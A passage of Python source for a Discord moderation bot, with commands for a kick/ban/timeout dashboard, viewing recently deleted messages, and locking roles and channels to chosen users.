        embed.set_footer(text=f"User ID: {member.id}")

        await system_channel.send(embed=embed)
        


class UserDashboardView(discord.ui.View):
    def __init__(self, ctx, target: discord.Member, dashboard_channel: discord.TextChannel):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.target = target
        self.dashboard_channel = dashboard_channel

    async def disable_all(self, interaction: discord.Interaction, msg: str):
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(content=msg, view=self)
        await asyncio.sleep(5)
        await self.dashboard_channel.delete()

    @discord.ui.button(label="Kick", style=discord.ButtonStyle.danger)
    async def kick_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.ctx.author.guild_permissions.kick_members:
            await self.target.kick(reason="Actioned from dashboard")
            await self.disable_all(interaction, f"{self.target.mention} has been **kicked**.")
        else:
            await interaction.response.send_message("No permission to kick.", ephemeral=True)

    @discord.ui.button(label="Ban", style=discord.ButtonStyle.danger)
    async def ban_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.ctx.author.guild_permissions.ban_members:
            await self.target.ban(reason="Actioned from dashboard")
            await self.disable_all(interaction, f"{self.target.mention} has been **banned**.")
        else:
            await interaction.response.send_message("No permission to ban.", ephemeral=True)

    @discord.ui.button(label="Timeout (1m)", style=discord.ButtonStyle.primary)
    async def timeout_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.ctx.author.guild_permissions.moderate_members:
            await self.target.timeout(duration=60, reason="Actioned from dashboard")
            await self.disable_all(interaction, f"{self.target.mention} has been **timed out for 1 minute**.")
        else:
            await interaction.response.send_message("No permission to timeout.", ephemeral=True)

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.disable_all(interaction, "Dashboard closed.")


@bot.command(name="dashboard")
@commands.has_permissions(manage_channels=True)
async def dashboard(ctx, member: discord.Member):
    guild = ctx.guild
    admin_category = get(guild.categories, name="Admin")

    if not admin_category:
        await ctx.send("Couldn't find a category called `Admin`.")
        return

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        ctx.author: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
    }

    dashboard_channel = await guild.create_text_channel(
        name=f"{member.name}-dashboard",
        overwrites=overwrites,
        category=admin_category,
        reason="Temporary dashboard"
    )

    view = UserDashboardView(ctx, member, dashboard_channel)
    embed = discord.Embed(
        title="User Dashboard",
        description=f"Manage actions for {member.mention}",
        color=COLOR
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    await dashboard_channel.send(embed=embed, view=view)

    await asyncio.sleep(65)
    try:
        await dashboard_channel.delete()
    except discord.NotFound:
        pass






sniped_messages = {}  # Format: {channel_id: [(content, author, time), ...]}

@bot.event
async def on_message_delete(message):
    """Store deleted messages for the snipe command, excluding tilde commands"""
    # Skip messages from the bot itself
    if message.author == bot.user:
        return
        
    # Skip messages that start with tilde (commands)
    if message.content.startswith('~'):
        return
        
    # Skip empty messages (like those with only attachments)
    if not message.content:
        return
        
    channel_id = message.channel.id
    
    # Initialize the list for this channel if it doesn't exist
    if channel_id not in sniped_messages:
        sniped_messages[channel_id] = []
    
    # Add the message to the list (up to 10 messages per channel)
    sniped_messages[channel_id].insert(0, (message.content, message.author, datetime.datetime.now()))
    
    # Keep only the 10 most recent messages
    if len(sniped_messages[channel_id]) > 10:
        sniped_messages[channel_id].pop()
    
@bot.command(name='snipe', aliases=['wb','grab','history'])
@is_admin()
async def snipe(ctx, num: int = 1):
    """
    Shows recently deleted messages in the current channel
    
    Parameters:
    - num: Optional number of messages to show (default: 1, max: 5)
    """
    channel_id = ctx.channel.id
    
    # Check if there are any sniped messages for this channel
    if channel_id not in sniped_messages or not sniped_messages[channel_id]:
        await ctx.send("There are no recently deleted messages in this channel!")
        return
    
    # Limit the number of messages to show
    num = min(num, 10)  # Maximum of 5 messages at once
    num = min(num, len(sniped_messages[channel_id]))  # Can't show more than we have
    
    if num == 1:
        # Single message display
        content, author, time = sniped_messages[channel_id][0]
        
        embed = discord.Embed(
            description=content,
            color=0x2a3ffa,
            timestamp=time
        )
        # Fix the author display - handle potential discriminator issues
        if hasattr(author, 'discriminator') and author.discriminator != '0':
            author_name = f"{author.name}#{author.discriminator}"
        else:
            author_name = author.name
            
        embed.set_author(name=author_name, icon_url=author.display_avatar.url)
        embed.set_footer(text=f"Deleted at")
        
        await ctx.send(embed=embed)
    else:
        # Multiple messages display
        embed = discord.Embed(
            title=f"Last {num} Deleted Messages",
            color=0x2a3ffa
        )
        
        for i in range(num):
            if i >= len(sniped_messages[channel_id]):
                break
                
            content, author, time = sniped_messages[channel_id][i]
            time_str = time.strftime("%Y-%m-%d %H:%M:%S")
            
            # Handle potential discriminator issues
            if hasattr(author, 'discriminator') and author.discriminator != '0':
                author_name = f"{author.name}#{author.discriminator}"
            else:
                author_name = author.name
            
            # Truncate content if too long
            if len(content) > 1024:
                content = content[:1021] + "..."
                
            embed.add_field(
                name=f"{i+1}. {author_name} at {time_str}",
                value=content,
                inline=False
            )
        
        embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        
        await ctx.send(embed=embed)
    
DATA_FILE = "locked_roles.json"

# Load saved locked roles from file
def load_locked_roles():
    if not os.path.exists(DATA_FILE) or os.path.getsize(DATA_FILE) == 0:
        return {}
    with open(DATA_FILE, "r") as f:
        try:
            return {
                int(gid): {int(rid): int(uid) for rid, uid in roles.items()}
                for gid, roles in json.load(f).items()
            }
        except json.JSONDecodeError:
            print("locked_roles.json is corrupted or empty. Resetting.")
            return {}

# Save locked roles to file
def save_locked_roles():
    with open(DATA_FILE, "w") as f:
        json.dump({str(gid): {str(rid): str(uid) for rid, uid in roles.items()} for gid, roles in locked_roles.items()}, f, indent=4)

locked_roles = load_locked_roles()

def is_admin():
    async def predicate(ctx):
        return ctx.author.guild_permissions.administrator
    return commands.check(predicate)


@bot.command(name="lockrole",aliases=['lr'])
@is_admin()
async def lockrole(ctx, role: discord.Role, user: discord.Member):
    guild_locks = locked_roles.setdefault(ctx.guild.id, {})
    guild_locks[role.id] = user.id
    save_locked_roles()
    await ctx.send(f"Locked role **{role.name}** to {user.mention}.")

@bot.command(name="unlockrole",aliases=['ulr'])
@is_admin()
async def unlockrole(ctx, role: discord.Role):
    guild_locks = locked_roles.get(ctx.guild.id, {})
    if role.id in guild_locks:
        del guild_locks[role.id]
        if not guild_locks:
            locked_roles.pop(ctx.guild.id)
        save_locked_roles()
        await ctx.send(f"Unlocked role **{role.name}**.")
    else:
        await ctx.send(f"Role **{role.name}** is not currently locked.")

@bot.command(name="lockedroles",aliases=['lrs'])
@is_admin()
async def lockedroles_cmd(ctx):
    guild_locks = locked_roles.get(ctx.guild.id, {})
    if not guild_locks:
        await ctx.send("No roles are currently locked in this server.")
        return

    embed = discord.Embed(title="Locked Roles", color=discord.Color.blue())
    for role_id, user_id in guild_locks.items():
        role = ctx.guild.get_role(role_id)
        user = ctx.guild.get_member(user_id)
        if role and user:
            embed.add_field(name=role.name, value=f"Locked to {user.mention}", inline=False)
    await ctx.send(embed=embed)

@tasks.loop(seconds=10)
async def enforce_locked_roles():
    for guild in bot.guilds:
        guild_locks = locked_roles.get(guild.id, {})
        for role_id, allowed_user_id in guild_locks.items():
            role = guild.get_role(role_id)
            user = guild.get_member(allowed_user_id)
            if role is None:
                continue

            # Grant role if user doesn't have it
            if user and role not in user.roles:
                try:
                    await user.add_roles(role, reason="Role locked to this user.")
                    print(f"Added {role.name} to {user}")
                except Exception as e:
                    print(f"Error granting role {role.name} to {user}: {e}")

            # Remove role from others
            for member in role.members:
                if member.id != allowed_user_id:
                    try:
                        await member.remove_roles(role, reason="Role locked to another user.")
                        print(f"Removed {role.name} from {member}")
                    except Exception as e:
                        print(f"Error removing {role.name} from {member}: {e}")


CHANNEL_LOCKS_FILE = "locked_channels.json"


def load_channel_locks():
    if not os.path.exists(CHANNEL_LOCKS_FILE):
        return {}
    with open(CHANNEL_LOCKS_FILE, "r") as f:
        return {int(gid): {int(cid): list(map(int, uids)) for cid, uids in channels.items()} for gid, channels in json.load(f).items()}

def save_channel_locks():
    with open(CHANNEL_LOCKS_FILE, "w") as f:
        json.dump({str(gid): {str(cid): list(map(str, uids)) for cid, uids in channels.items()} for gid, channels in locked_channels.items()}, f, indent=4)

locked_channels = load_channel_locks()

def is_admin():
    async def predicate(ctx):
        return ctx.author.guild_permissions.administrator
    return commands.check(predicate)


@bot.command(name="lockchannel",aliases=['lock','lc','oppress'])
@is_admin()
async def lockchannel(ctx, *allowed: discord.Member):
    """Admin command to only allow certain users to speak in a channel quickly."""
    channel = ctx.channel
    guild_id = ctx.guild.id
    channel_id = channel.id

    if not allowed:
        await ctx.send("You must mention at least one user to allow.")
        return

    # Save allowed users
    locked_channels.setdefault(guild_id, {})[channel_id] = [u.id for u in allowed]

    # Update channel permissions
    overwrite = discord.PermissionOverwrite(send_messages=False)
    await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)

    for user in allowed:
        await channel.set_permissions(user, send_messages=True)

    save_channel_locks()
    await ctx.send(f"Locked {channel.mention}. Only {', '.join(u.mention for u in allowed)} can speak here.")


@bot.command(name="unlockchannel",aliases=['ulc','unlock','unoppress'])
@is_admin()
async def unlockchannel(ctx):
    """Unlocks a locked channel."""
    channel = ctx.channel
    guild_id = ctx.guild.id
    channel_id = channel.id

    if guild_id in locked_channels and channel_id in locked_channels[guild_id]:
        allowed_ids = locked_channels[guild_id][channel_id]

        # Reset permissions
        await channel.set_permissions(ctx.guild.default_role, overwrite=None)
        for uid in allowed_ids:
            user = ctx.guild.get_member(uid)
            if user:
                await channel.set_permissions(user, overwrite=None)

        del locked_channels[guild_id][channel_id]
        if not locked_channels[guild_id]:
            del locked_channels[guild_id]

        save_channel_locks()
        await ctx.send(f"Unlocked {channel.mention}. Everyone can talk now.")
    else:
        await ctx.send("This channel is not currently locked.")



@bot.event
async def on_command_error(ctx, error):
    """Handle command errors."""
    if isinstance(error, commands.CheckFailure):
        await ctx.send("You need administrator permissions to use this command.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"Missing required argument: {error.param.name}")
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send("Member not found.")
    elif isinstance(error, commands.CommandNotFound):
        pass  # Ignore command not found errors
    else:
        await ctx.send(f"An error occurred: {error}")

if __name__ == "__main__":
    bot_token = os.getenv('DISCORD_TOKEN')
    prevent_sleep = lambda: ctypes.windll.kernel32.SetThreadExecutionState(
        0x80000000 | 0x00000001 | 0x00000002
    )
    allow_sleep = lambda: ctypes.windll.kernel32.SetThreadExecutionState(0x80000000)
    
    try:
        prevent_sleep()
        bot.run(bot_token)
        # start_gui()
    finally:
        allow_sleep()